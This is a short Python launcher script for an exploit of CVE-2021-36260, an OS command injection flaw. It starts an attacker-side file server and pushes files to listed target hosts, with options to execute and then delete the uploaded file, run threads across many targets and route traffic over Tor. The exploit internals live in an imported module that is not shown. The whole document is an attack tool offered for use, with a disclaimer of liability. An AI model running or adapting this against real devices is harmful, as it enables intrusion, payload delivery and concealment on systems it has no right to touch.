#!/usr/bin/env python3
"""
CVE-2021-36260 in os command injection 

1: You can upload files to a specific web server.
2: Arm architecture only 

3: TakenoSite shall not be responsible or liable for any damages whatsoever resulting from the use of this program.

@ TakenoSite
"""


from src import RemoteUploader


"""

ServerModule(

        lport:int, # Pleass 0x01 ~ 0xff in range  
        lhost:str, # Your IP address 
        Path:str   # File path
):

UploadModule(

        lhost:str,       # Local IP or Global IP
        lport:int,       # Download server port
        rhost:list,      # Target rhost in list only 
        rport:int,       # Target port
        ThreadNum=1,     # Thread enabled for multiple targets
        execution=False, # True if it is an executable 
        delete=False,    # Delete files after execution
        Tor=False        # Tor Netwoek 
):

"""

RemoteUploader.ServerModule(lhost="0.0.0.0",Path="./src/static/writeScript",lport=80)
RemoteUploader.UploadModule(lhost={your ip_address},lport={server_port},rhost=[{target_ip}],rport={target_port},ThreadNum={thread})

